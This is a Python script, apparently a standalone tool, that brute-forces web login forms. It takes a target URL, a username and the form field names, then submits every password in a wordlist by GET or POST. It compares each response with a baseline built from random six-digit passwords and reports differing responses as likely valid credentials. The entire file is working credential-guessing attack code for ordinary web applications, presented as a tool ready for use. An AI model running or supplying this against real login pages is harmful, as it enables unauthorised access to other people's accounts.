import requests
from sys import argv
from concurrent.futures import ProcessPoolExecutor
from concurrent.futures import wait
from concurrent.futures import ALL_COMPLETED
import concurrent.futures
import sys
import time as time
import base64 as base64
from random import randint


possiblehits = []
baseline = []

if '-d' in argv:
    db = True
else:
    db = False

def debug(r,rt):
    global db
    if db:
        print (r)
        print(len(rt))
    return

def progress(count, total):
    count += 1
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 4)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)

    sys.stdout.write('[%s] %s%s\r' % (bar, percents, '%'))
    sys.stdout.flush()

class Get:
    def __init__(self, url, wl):
            self.url = url
            self.wl = wl
            self.user = input('[*] Username:\n> ')
            self.fu = input('[*] Parameter Username field:\n> ')
            self.fp = input('[*] Parameter Password Field:\n> ')
            self.formData = {self.fu:self.user,self.fp:''}
            print(self.formData)
            self.baseline = baseliner('GET', 6, self.formData, self.fp, self.url)

    def send(self, w):
        self.formData[self.fp] = w
        r = requests.get(self.url, params=self.formData)
        debug(r.url,r.text)
        while len(r.text) < 1:
            pass

        t = str(r)
        if t not in self.baseline or len(r.text) not in self.baseline:
            print('\n~~~POSSIBLE MATCH~~~\n')
            print(self.formData[self.fu], self.formData[self.fp])
            print('\n~~~POSSIBLE MATCH~~~\n')
            return [self.formData[self.fu],self.formData[self.fp]]
        return 0


class Post:
    def __init__(self, url, wl):
            self.url = url
            self.wl = wl
            self.user = input('[*] Username:\n> ')
            self.fu = input('[*] Form Username field:\n> ')
            self.fp = input('[*] Form Password Field:\n> ')
            self.formData = {self.fu:self.user,self.fp:''}
            print(self.formData)
            self.baseline = baseliner('POST', 6, self.formData, self.fp, self.url)

    def send(self, w):
        self.formData[self.fp] = w
        r = requests.post(self.url, data=self.formData)
        debug(r,r.text)
        while len(r.text) < 1:
            pass

        t = str(r)

        if t not in self.baseline or len(r.text) not in self.baseline:
            print('\n~~~POSSIBLE MATCH~~~\n')
            print(self.formData[self.fu], self.formData[self.fp])
            print('\n~~~POSSIBLE MATCH~~~\n')
            return [self.formData[self.fu],self.formData[self.fp]]
        return 0

def start(self):
    total = len(self.wl)
    count = 0
    with concurrent.futures.ProcessPoolExecutor() as executor:
        for w in self.wl:
            s = executor.submit(self.send, w)
            if s.result() != 0:
                possiblehits.append(s.result())
            progress(count, total)
            count += 1
    executor.shutdown(wait=True)
    print('\n~~~~~~~~~~~~~~~~~~Possible Hits~~~~~~~~~~~~~~~~~~\n')
    print(possiblehits)

#Send 10 6 digit random test passwords to get baseline incorrect response codes / response text length
def baseliner(type, I ,formData, fp, url):
    global db

    for i in range(10):
        range_start = 10**(I-1)
        range_end = (10**I)-1
        test = randint(range_start, range_end)

        if type == 'POST':
            formData[fp] = test
            r = requests.post(url, data=formData)
            rlength = len(r.text)
            rline = str(r)
            if rlength not in baseline:
                baseline.append(rlength)
            if rline not in baseline:
                baseline.append(rline)

        if type == 'GET':
            formData[fp] = test
            r = requests.get(url, params=formData)
            rlength = len(r.text)
            rline = str(r)
            if rlength not in baseline:
                baseline.append(rlength)
            if rline not in baseline:
                baseline.append(rline)

    if db:
        print('~~~Starting with Baseline~~~')
        print(baseline)
    return baseline


#New interface
def main():
    url = input('[*] Input the URL:\n[*] Example: http://192.168.1.1/form\n> ')
    file = input('[*] Wordlist Location:\n> ')
    wl = []
    with open(file, "r",encoding = 'ISO-8859-1') as f:
        for line in f:
            line = line.strip()
            wl.append(line)


    while True:
        selection = input('[*] Type:\n1. Post\n2. GET\n> ')
        if selection == '1':
            x = Post(url, wl)
            start(x)
            break
        if selection == '2':
            x = Get(url, wl)
            start(x)
            break
        else:
            print('Input should be 1 or 2')

if __name__=="__main__":
    main()
